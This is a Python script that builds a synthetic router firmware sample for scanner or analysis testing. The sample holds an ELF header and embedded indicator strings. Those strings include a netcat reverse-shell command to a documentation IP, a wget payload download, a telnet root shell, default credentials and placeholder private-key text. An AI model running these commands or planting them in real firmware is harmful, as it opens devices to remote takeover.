import os
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
SAMPLES_DIR = PROJECT_ROOT / "samples"

ELF_HEADER = bytes([
    0x7F, 0x45, 0x4C, 0x46,
    0x01, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x28, 0x00,
])

SYNTHETIC_STRINGS = [
    b"BusyBox v1.19.4 (2019-01-01)",
    b"telnetd -l /bin/sh",
    b"admin:admin",
    b"root:$1$demo$syntheticpasswordhash",
    b"http://update.demo-iot-vendor.net/firmware/check",
    b"nc -e /bin/sh 203.0.113.55 4444",
    b"-----BEGIN RSA PRIVATE KEY-----",
    b"MIIEowIBAAKCAQEA_DEMO_SYNTHETIC_KEY_MATERIAL",
    b"-----END RSA PRIVATE KEY-----",
    b"wget http://198.51.100.20/payload.bin",
    b"/etc/init.d/S50telnet",
    b"chmod 777 /tmp/update.sh",
]


def build_sample_firmware() -> bytes:
    body = ELF_HEADER
    for entry in SYNTHETIC_STRINGS:
        body += entry + b"\x00"
    body += os.urandom(2048)
    return body


def main() -> None:
    SAMPLES_DIR.mkdir(parents=True, exist_ok=True)
    output_path = SAMPLES_DIR / "demo_router_firmware.bin"
    output_path.write_bytes(build_sample_firmware())
    print(f"Sample firmware written to {output_path}")


if __name__ == "__main__":
    main()
